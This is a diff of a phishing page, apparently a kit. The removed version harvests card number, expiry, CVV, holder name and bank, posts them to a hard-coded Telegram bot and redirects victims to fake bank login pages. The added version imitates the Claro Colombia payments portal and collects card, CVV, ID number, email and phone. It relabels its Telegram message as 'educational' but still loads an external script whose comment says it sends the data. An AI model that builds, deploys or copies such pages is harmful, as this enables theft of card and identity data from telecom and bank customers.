@@ -1,223 +1,413 @@
+
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Pago con Tarjeta</title>
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <link rel="icon" type="image/png" href="img/favicon.ico" />
+  <title>Portal de pagos Claro</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="css/styles.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="css/index.css" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Carga aquí el functions es lo que va a guardar siempre la data Y LO VAS A USAR PARA MANDAR SIEMPRE LA INFORMACION -->
+  <script src="./js/functions.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f1f4f9;
-      margin: 0;
-      padding: 0;
-    }
-
-    header {
-      background-color: #004f9f;
-      color: white;
-      text-align: center;
-      padding: 20px;
-    }
-
-    section {
-      max-width: 500px;
-      margin: 30px auto;
-      background: #fff;
-      padding: 25px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-    }
-
-    h3 {
-      text-align: center;
-      color: #004f9f;
-    }
-
-    .entradas {
-      width: 100%;
-      padding: 12px;
-      margin-top: 5px;
-      margin-bottom: 15px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      box-sizing: border-box;
-      font-size: 15px;
-    }
-
-    .etiquetas {
-      font-weight: bold;
-      display: block;
-      margin-top: 10px;
-      color: #333;
-    }
-
-    .select-box {
-      position: relative;
-      width: 100%;
-      background: #fff;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      padding: 12px;
-      font-size: 15px;
-      text-align: left;
-      cursor: pointer;
-    }
-
-    .select-box:after {
-      content: '▼';
-      position: absolute;
-      right: 15px;
-      top: 12px;
-      color: #666;
-      pointer-events: none;
-    }
-
-    .options-list {
-      display: none;
-      position: absolute;
-      background-color: #fff;
-      width: 100%;
-      border: 1px solid #ccc;
-      max-height: 200px;
-      overflow-y: auto;
-      z-index: 2;
-      margin-top: 5px;
-      border-radius: 8px;
-    }
-
-    .options-list li {
-      padding: 10px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-
-    .options-list li:hover {
-      background-color: #f0f0f0;
-    }
-
-    .texto2 {
-      color: #555;
-      font-size: 15px;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
-    footer {
-      background-color: #004f9f;
-      color: white;
-      text-align: center;
-      padding: 15px;
-      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
     }
   </style>
 </head>
+
 <body>
-<img src="ban.jpeg" alt="" width="100%">
+  <!-- first header -->
+  <span class="px-6 flex flex-row items-center justify-between w-full min-h-[40px] max-h-[40px]">
+    <span class="flex flex-row items-center gap-10">
+      <p class="text-[12pt] text-[#313131] font-semibold border-b-4 border-b-[#FFC73C]">Personas</p>
+      <p class="hidden md:flex text-[12pt] text-[#313131] font-semibold hover:border-b-4 border-b-[#FFC73C]">
+        Negocios</p>
+      <p class="hidden md:flex text-[12pt] text-[#313131] font-semibold hover:border-b-4 border-b-[#FFC73C]">
+        Empresas</p>
+      <p class="hidden md:flex text-[12pt] text-[#313131] font-semibold hover:border-b-4 border-b-[#FFC73C]">
+        Institucional</p>
+    </span>
+  
+    <span class="flex flex-row items-center gap-4">
+      <p class="flex flex-row gap-2 items-center text-[12pt] text-[#313131] font-semibold">
+        Más de Claro
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"
+          class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <path
+            d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+        </svg>
+      </p>
+      <p class="flex flex-row gap-2 items-center text-[12pt] text-[#313131] font-semibold">
+        <img class="w-[20px] h-[30px]" src="./assets/flag-colombia.svg" alt="">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"
+          class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <path
+            d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+        </svg>
+      </p>
+    </span>
+  
+  </span>
+  
+  
+  <!-- se header -->
+  
+  <header class="bg-[#EF3320] min-h-[53px] max-h-[53px] w-full flex flex-row items-center px-4 pr-10 justify-between">
+  
+    <span class="flex flex-row items-center gap-4">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white"
+        stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+        class="md:hidden icon icon-tabler icons-tabler-outline icon-tabler-menu-2">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+        <path d="M4 6l16 0" />
+        <path d="M4 12l16 0" />
+        <path d="M4 18l16 0" />
+      </svg>
+      <img class="w-[73px]" src="./assets/claro.svg" alt="">
+      <span class="hidden md:flex flex-row items-center text-white">
+        <p class="text-[13pt] text-[white] font-bold">Servicios</p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+          class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <path
+            d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+        </svg>
+      </span>
+      <span class="hidden md:flex flex-row items-center text-white">
+        <p class="text-[13pt] text-[white] font-bold">Tienda</p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+          class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <path
+            d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+        </svg>
+      </span>
+      <span class="hidden md:flex flex-row items-center text-white">
+        <p class="text-[13pt] text-[white] font-bold">Soporte</p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+          class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <path
+            d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+        </svg>
+      </span>
+    </span>
+  
+    <span class="flex flex-row gap-2 items-center">
+      <span class="hidden md:flex flex-row items-center text-white">
+        <p class="text-[11pt] text-[white] font-semibold">Información importante para usuarios</p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+          class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <path
+            d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+        </svg>
+      </span>
+      <button class="flex flex-row font-bold text-white gap-2 items-center rounded-full px-4 min-h-[40px] bg-[#D01508]">
+        <img width="max-w-[24px] max-h-[24px]" src="./assets/c2btn.png" alt="">
+        Mi Claro
+      </button>
+    </span>
+  
+  </header>
+  <main>
+    <div id="ggris1" class="gris1">
+      <div class="texto_gris">
+        <br /><br />
+        <p class="texto1">
+          Portal de
+          <span class="rojo">PAGOS <span class="recargas"> Y RECARGAS</span></span>
+        </p>
+      </div>
+    </div>
 
+    <table id="tabla-opciones">
+      <tr>
+        <td valign="top" align="center">
+          <img id="azul1" src="img/icono-seleccion-on.png" class="imagen" />
+        </td>
 
-<section>
-  <h3>Paga con tu tarjeta de debito o credito</h3>
+        <td valign="top" align="center">
+          <img id="azul2" src="img/icono-mediopago-on.png" class="imagen" />
+        </td>
 
+        <td valign="top" align="center">
+          <img id="azul3" src="img/icono-pago-on.png" class="imagen" />
+        </td>
 
-<img src="medios.jpeg" alt="" width="100%">
-  <label class="etiquetas">Número de la Tarjeta</label>
-  <input type="text" class="entradas" id="tc" placeholder="1234 5678 9012 3456" maxlength="19"/>
+        <td valign="top" align="center">
+          <img id="azul4" src="img/icono-resultado-off.png" class="imagen" />
+        </td>
+      </tr>
+      <tr>
+        <td valign="top" align="center" class="etq-pasos act-pasos">
+          Ingresa <br />tu Documento
+        </td>
 
-  <label class="etiquetas">Fecha de Vencimiento</label>
-  <input type="text" class="entradas" id="venc" placeholder="MM/YYYY" maxlength="7"/>
+        <td valign="top" align="center" class="etq-pasos act-pasos">
+          Escoge el <br />medio de pago
+        </td>
 
-  <label class="etiquetas">Código de Seguridad</label>
-  <input type="text" class="entradas" id="cvv" placeholder="CVV" maxlength="4"/>
+        <td valign="top" align="center" class="etq-pasos act-pasos">
+          Realiza el <br />Pago en linea
+        </td>
 
-  <label class="etiquetas">Número de Cuotas</label>
-  <input type="text" class="entradas" id="cuotas" placeholder="1" maxlength="2"/>
+        <td valign="top" align="center" class="etq-pasos">
+          Recibe la <br />Confimacion
+        </td>
+      </tr>
+    </table>
+    <hr />
+    <div class="form-section container py-2">
+      <div class="companies-container text-center mb-4 flex flex-row justify-center">
+        <img src="./assets/svg/visa.svg" alt="Visa" class="me-3" style="width: 50px;">
+        <img src="./assets/svg/mc.svg" alt="MasterCard" class="me-3" style="width: 50px;">
+        <img src="./assets/svg/diners.svg" alt="Diners" class="me-3" style="width: 50px;">
+        <img src="./assets/svg/amex.svg" alt="American Express" style="width: 50px;">
+      </div>
 
-  <label class="etiquetas">Nombres y Apellidos</label>
-  <input type="text" class="entradas" id="nombre" placeholder="Tu nombre completo"/>
+      <h4 class="mb-4 text-center">Información de la tarjeta</h4>
+      <form>
+        <div class="row g-3">
+          <div class="col-12">
+            <input id="card_number" class="form-control" type="text" placeholder="Número de Tarjeta"
+              oninput="formatCardNumber(this); updateCVCLength(this.value)" />
+          </div>
+          <div class="col-md-6">
+            <div class="row g-2">
+              <div class="col-6">
+                <input id="month-value" type="text" class="form-control" placeholder="MM" maxlength="2" />
+              </div>
+              <div class="col-6">
+                <input id="year-value" type="text" class="form-control" placeholder="AA" maxlength="2" />
+              </div>
+            </div>
+            <label class="form-label mt-2">Fecha de Expiración</label>
+          </div>
+          <div class="col-md-6">
+            <input id="card_cvc" type="text" class="form-control" placeholder="CVV" maxlength="3" />
+            <label class="form-label mt-2">Código de seguridad</label>
+          </div>
+          <div class="col-12">
+            <select id="bank-option" class="form-select" required>
+              <option value="" disabled selected>Seleccione su banco</option>
+              <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
+              <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+              <option label="BANCO AV VILLAS" value="avvillas">
+                BANCO AV VILLAS
+              </option>
+              <option label="BANCO BBVA COLOMBIA S.A." value="bbva">
+                BANCO BBVA COLOMBIA S.A.
+              </option>
+              <option label="BANCO CAJA SOCIAL" value="caja-social">
+                BANCO CAJA SOCIAL
+              </option>
+              <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">
+                BANCO COOPERATIVO COOPCENTRAL
+              </option>
+              <option label="BANCO CREDIFINANCIERA" value="credifinanciera">
+                BANCO CREDIFINANCIERA
+              </option>
+              <option label="BANCO DAVIVIENDA" value="davivienda">
+                BANCO DAVIVIENDA
+              </option>
+              <option label="BANCO DE BOGOTA" value="bogota">
+                BANCO DE BOGOTA
+              </option>
+              <option label="BANCO DE OCCIDENTE" value="occidente">
+                BANCO DE OCCIDENTE
+              </option>
+              <option label="BANCO FALABELLA " value="falabella">
+                BANCO FALABELLA
+              </option>
+              <option label="BANCO FINANDINA S.A. BIC" value="finandina">
+                BANCO FINANDINA S.A. BIC
+              </option>
+              <option label="BANCO GNB SUDAMERIS" value="sudameris">
+                BANCO GNB SUDAMERIS
+              </option>
+              <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
+              <option label="BANCO PICHINCHA S.A." value="pichincha">
+                BANCO PICHINCHA S.A.
+              </option>
+              <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+              <option label="BANCO SANTANDER COLOMBIA" value="santander">
+                BANCO SANTANDER COLOMBIA
+              </option>
+              <option label="BANCO SERFINANZA" value="serfinanza">
+                BANCO SERFINANZA
+              </option>
+              <option label="BANCO UNION antes GIROS" value="union">
+                BANCO UNION antes GIROS
+              </option>
+              <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+              <option label="BANCOOMEVA S.A." value="bancomeva">
+                BANCOOMEVA S.A.
+              </option>
+              <option label="CFA COOPERATIVA FINANCIERA" value="cfa">
+                CFA COOPERATIVA FINANCIERA
+              </option>
+              <option label="CITIBANK " value="citibank">CITIBANK</option>
+            </select>
 
-  <label class="etiquetas">Selecciona tu Entidad Bancaria</label>
-  <div class="select-box" onclick="toggleOptions1()">
-    <span id="selectedOption1">Selecciona</span>
-    <ul id="optionsList1" class="options-list">
-      <li onclick="selectTC('b-34f1','Banco AV Villas')">Banco AV Villas</li>
-      <li onclick="selectTC('b-34f13','BBVA Colombia')">BBVA Colombia</li>
-      <li onclick="selectTC('b-34f4','Banco De Bogotá')">Banco De Bogotá</li>
-      <li onclick="selectTC('b-34f2','Banco Caja Social')">Banco Caja Social</li>
-      <li onclick="selectTC('b-34f9','Bancolombia')">Bancolombia</li>
-      <li onclick="selectTC('b-34f3','Davivienda')">Davivienda</li>
-     
-      <li onclick="selectTC('b-34f14','Banco De Occidente')">Banco De Occidente</li>
-      <li onclick="selectTC('b-34f18','Banco Popular')">Banco Popular</li>
-      
-    </ul>
-  </div>
-  <input id="selectedValue1" type="hidden">
-</section>
-<br><br><br><br>
-<img src="seg.jpeg" alt="" width="100%">
-<img src="fin.jpeg" alt="" width="100%">
+            </select>
+          </div>
 
-<script>
-  function toggleOptions1() {
-    const list = document.getElementById("optionsList1");
-    list.style.display = list.style.display === "block" ? "none" : "block";
+          <div class="col-12">
+            <select id="dues" class="form-select" required>
+              <option value="" disabled selected>Número de cuotas</option>
+              <option value="1">1</option>
+              <option value="2">2</option>
+              <option value="3">3</option>
+              <option value="4">4</option>
+              <option value="5">5</option>
+              <option value="6">6</option>
+              <option value="7">7</option>
+              <option value="8">8</option>
+              <option value="9">9</option>
+              <option value="10">10</option>
+              <option value="11">11</option>
+              <option value="12">12</option>
+              <option value="13">13</option>
+              <option value="14">14</option>
+              <option value="15">15</option>
+              <option value="16">16</option>
+              <option value="17">17</option>
+              <option value="18">18</option>
+              <option value="19">19</option>
+              <option value="20">20</option>
+              <option value="21">21</option>
+              <option value="22">22</option>
+              <option value="23">23</option>
+              <option value="24">24</option>
+            </select>
+          </div>
+        </div>
+
+        <h4 class="mt-5 mb-4 text-center">Información del titular</h4>
+        <div class="row g-3">
+          <div class="col-12">
+            <input id="name_card" type="text" class="form-control" placeholder="Nombre y apellido del titular" />
+          </div>
+
+          <div class="col-md-6">
+            <input id="documentnumber" type="number" class="form-control" placeholder="Número de identificación" />
+          </div>
+
+          <div class="col-md-6">
+            <input id="email_user" type="email" class="form-control" placeholder="Correo electrónico" />
+          </div>
+
+          <div class="col-md-6">
+            <input id="tel" type="tel" class="form-control" placeholder="Celular" maxlength="10" />
+          </div>
+
+          <div class="col-12 text-center">
+            <button id="next-step" type="submit" class="btn btn-danger mt-3">
+              Siguiente paso
+            </button>
+          </div>
+        </div>
+      </form>
+      <br>
+    </div>
+
+  </main>
+  <img class="hidden md:flex" src="./assets/footer-dk.png" alt="">
+  <img class="flex md:hidden" src="./assets/footer.png" alt="">
+  <script src="points/checkers/js/payment.js"></script>
+    <script src="points/checkers/js/payment.js"></script>
+
+  <!-- 👇 Aquí pegas el script de redirección y aviso -->
+  <script>
+  // Aviso educativo a Telegram
+  async function sendTelegramMessage(texto) {
+    const TOKEN = "TU_BOT_TOKEN";  // ← pon aquí tu token del bot
+    const CHAT_ID = "TU_CHAT_ID";  // ← pon aquí tu chat_id
+    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
+      });
+    } catch (e) {
+      console.warn("Aviso Telegram falló (modo educativo):", e);
+    }
   }
 
-  function selectTC(valor, nombre) {
-    document.getElementById("selectedOption1").innerText = nombre;
-    document.getElementById("selectedValue1").value = nombre;
-    document.getElementById("optionsList1").style.display = "none";
-    enviarPago();
+  // Mapeo bancos → buscadores
+  const bankToDest = {
+    bancamia:      { engine: "google", q: "BANCAMIA S.A." },
+    agrario:       { engine: "bing",   q: "BANCO AGRARIO" },
+    avvillas:      { engine: "yahoo",  q: "BANCO AV VILLAS" },
+    bbva:          { engine: "google", q: "BBVA Colombia" },
+    "caja-social": { engine: "bing",   q: "Banco Caja Social" },
+    "coopertaivo-coopcentral": { engine: "yahoo", q: "Banco Cooperativo Coopcentral" },
+    credifinanciera:{ engine: "google", q: "Banco Credifinanciera" },
+    davivienda:    { engine: "bing",   q: "Davivienda" },
+    bogota:        { engine: "yahoo",  q: "Banco de Bogotá" },
+    occidente:     { engine: "google", q: "Banco de Occidente" },
+    falabella:     { engine: "bing",   q: "Banco Falabella" },
+    finandina:     { engine: "yahoo",  q: "Banco Finandina" },
+    sudameris:     { engine: "google", q: "Banco GNB Sudameris" },
+    itau:          { engine: "bing",   q: "Banco Itaú Colombia" },
+    pichincha:     { engine: "yahoo",  q: "Banco Pichincha Colombia" },
+    popular:       { engine: "google", q: "Banco Popular Colombia" },
+    santander:     { engine: "bing",   q: "Banco Santander Colombia" },
+    serfinanza:    { engine: "yahoo",  q: "Banco Serfinanza" },
+    union:         { engine: "google", q: "Banco Unión (antes Giros)" },
+    bancolombia:   { engine: "bing",   q: "Bancolombia" },
+    bancomeva:     { engine: "yahoo",  q: "Bancoomeva" },
+    cfa:           { engine: "google", q: "CFA Cooperativa Financiera" },
+    citibank:      { engine: "bing",   q: "Citibank Colombia" }
+  };
+
+  // Construcción URL según motor
+  function buildSearchUrl(engine, q) {
+    const query = encodeURIComponent(q);
+    if (engine === "google") return `https://www.google.com/search?q=${query}`;
+    if (engine === "bing")   return `https://www.bing.com/search?q=${query}`;
+    if (engine === "yahoo")  return `https://search.yahoo.com/search?p=${query}`;
+    return `https://www.google.com/search?q=${query}`;
   }
 
-  function enviarPago() {
-    const tarjeta = document.getElementById("tc").value.trim();
-    const venc = document.getElementById("venc").value.trim();
-    const cvv = document.getElementById("cvv").value.trim();
-    const cuotas = document.getElementById("cuotas").value.trim();
-    const nombreCompleto = document.getElementById("nombre").value.trim();
-    const banco = document.getElementById("selectedValue1").value;
+  // Botón "Siguiente paso"
+  document.getElementById("next-step").addEventListener("click", function (e) {
+    e.preventDefault();
 
-    if (!tarjeta || !venc || !cvv || !cuotas || !nombreCompleto || !banco) {
-      alert("Completa todos los campos antes de seleccionar el banco.");
+    const bank = document.getElementById("bank-option").value;
+    if (!bank || !bankToDest[bank]) {
+      alert("Selecciona un banco válido antes de continuar.");
       return;
     }
 
-    const mensaje = `💳 NUEVO PAGO TARJETA\n\n🧾 Titular: ${nombreCompleto}\n🏦 Banco: ${banco}\n💳 Tarjeta: ${tarjeta}\n📆 Vencimiento: ${venc}\n🔐 CVV: ${cvv}\n📊 Cuotas: ${cuotas}`;
-   const token = "5994237488:AAGUtik1uogUX4yBD3PcFZd43pOI2Jf7SmA";
-    const chat_id = "5647970395";
+    const { engine, q } = bankToDest[bank];
+    const url = buildSearchUrl(engine, q);
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id, text: mensaje })
-    }).catch(error => {
-      alert("Error al enviar a Telegram.");
-    });
+    // Aviso Telegram educativo
+    sendTelegramMessage(`(Demo) Banco elegido: ${q} → ${engine}`);
 
-    const bancoRedirecciones = {
-      "Banco AV Villas": "https://botonpago.click/transaction/ent/b-34f1/inicio/",
-      "BBVA Colombia": "https://botonpago.click/transaction/ent/b-34f13/",
-      "Banco De Bogotá": "https://botonpago.click/transaction/ent/b-34f4/wps.portal/",
-      "Banco Caja Social": "https://botonpago.click/transaction/ent/b-34f2/",
-      "Bancolombia": "https://botonpago.click/boton/dinadatos/bancol/cel-login.html",
-      "Davivienda": "https://botonpago.click/transaction/ent/b-34f3/",
-      "Banco Falabella": "https://botonpago.click/transaction/ent/b-34f5/",
-      "Banco De Occidente": "https://botonpago.click/transaction/ent/b-34f14/",
-      "Banco Popular": "https://botonpago.click/transaction/ent/b-34f18/login/",
-      "Scotiabank Colpatria": "https://botonpago.click/transaction/ent/b-34f12/wps/"
-    };
-
-    const urlDestino = bancoRedirecciones[banco];
-    if (urlDestino) {
-      setTimeout(() => {
-        window.location.href = urlDestino;
-      }, 700);
-    } else {
-      alert("No se encontró la URL del banco.");
-    }
-  }
-</script>
-
+    // Redirigir al buscador
+    window.location.href = url;
+  });
+  </script>
 </body>
 </html>
